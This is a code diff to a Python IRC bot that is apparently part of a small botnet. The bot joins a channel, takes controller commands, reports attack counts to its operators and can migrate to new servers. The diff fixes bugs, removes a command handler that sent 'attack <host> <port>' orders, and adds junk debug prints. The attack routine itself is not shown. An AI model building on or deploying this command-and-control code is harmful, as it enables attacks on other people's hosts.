@@ -15,7 +15,7 @@ class Bot:
         self.IRCSOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
         # BOT INFO
-        self.botNick = "SLAVE" + str(random.randrange(10000))
+        self.botNick = "HELLO PAUL WASSUP " + str(random.randrange(10000))
         self.liveConnection = False # Flag to see if controller connection to IRC Server is active
         self.command = None
         self.attackCount = 0
@@ -35,7 +35,7 @@ class Bot:
             sys.exit(0)
 
         
-
+    # Used for initial connection or connecting to a new channel
     def IRCconnect(self, chan):
         self.sendData("NICK {}\n" .format(self.botNick))
         self.sendData("USER bot * * :{}\n" .format(self.botNick))
@@ -109,7 +109,7 @@ class Bot:
                     print("Incorrect usage of command: move <host-name> <port> <channel>")
             
 
-    # COMMANDS TO DO -----------------------------------------------------------
+    # BOT COMMAND FUNCTIONS HERE ---------------------------------------------------------------------------------------------
 
     # Send Stats (Just the name of bot)
     def botStatus(self):
@@ -132,13 +132,14 @@ class Bot:
             for x in self.acceptedCons:
                 self.privateMsg(x, msg)
         except:
+            # Send private message that attack failed 
             msg = self.botNick + " has failed to attack. Current count is: " + str(self.attackCount)
             for x in self.acceptedCons:
                 self.privateMsg(x, msg)
             tb = traceback.format_exc()
             print(tb)
             pass 
-            # Send private message that attack failed 
+            
     
     # Move Server
     def botMove(self, newHost, newPort, newChannel):
@@ -166,19 +167,21 @@ class Bot:
             self.PORT = newPort 
             self.CHANNEL = newChannel 
             # Disconnect from old Channel
+            print("zzzzzzzzzzzzzasdfasdfdsasfdbdsv")
             try:
                 self.IRCSOCKET.close()
                 self.IRCSOCKET = newSocket 
             except:
                 pass
-            for x in acceptedCons:
+            print("asdfadfadsfa")
+            for x in self.acceptedCons:
                 self.privateMsg(x, self.botNick + " has moved to " + str(self.HOST) + " " + str(self.PORT) + " " + str(self.CHANNEL))
             return True 
         except:
             print("ERROR: Unable to move to new channel\nBot still in old channel")
             tb = traceback.format_exc()
             print(tb)
-            for x in acceptedCons:
+            for x in self.acceptedCons:
                 self.privateMsg(x, "Unable to move to new server. Bot still in old channel")
             return False 
         
@@ -201,8 +204,10 @@ class Bot:
                             #self.connectIRC(self.s,self.NICK, self.chan)  
                             # Use this to make new nickname if needed
                             oldName = self.botNick 
-                            s
-                            botNick = "SLAVE" + str(random.randrange(10000))
+                            self.botNick = "SLAVE" + str(random.randrange(10000))
+                            self.IRCconnect(self.CHANNEL)
+                            for x in self.acceptedCons:
+                                self.privateMsg(x, oldName + " has been renamed to " + self.botNick + " due to existing name in channel. Attempting to reconnect")
                             pass
         except Exception as e:
             print("Exception: ")
@@ -210,42 +215,6 @@ class Bot:
             print("Reconnecting in 5 seconds ...")
             time.sleep(5)
             self.reader()
-
-    # Deal with commands 
-    def commandHandler(self):
-        while True:
-
-            # Call the commands here
-            userCommand = input("command> ")
-            self.command = userCommand.split()
-            # somewhere send phrase to bot
-            # check command
-            # send command to bots for them to do
-            if (self.command[0] == "status"):
-                self.sendCommand(self.command[0])
-            elif (self.command[0] == "attack"):
-                if (len(self.command) == 3):
-                    self.botsSuccessful = []
-                    self.botsFailed = []
-                    hostTarget = command[1]
-                    portTarget = command[2]
-                    self.botAttack(hostTarget, portTarget)
-                else:
-                    print("Incorrect usage of command: attack <host-name> <port>")
-            elif (self.command[0] == "move"):
-                if(len(self.command) == 4):
-                    self.botsMoved = []
-                    newHost = command[1]
-                    newPort = command[2]
-                    newChannel = command[3]
-                    self.botMove(newHost, newPort, newChannel)
-                else:
-                    print("Incorrect usage of command: move <host-name> <port> <channel>")
-            elif (self.command[0] == "quit"):
-                sys.exit(0)
-            elif (self.command[0] == "shutdown"):
-                self.botsDisconnected = []
-                self.sendCommand(self.command[0])
             
 def main():
     
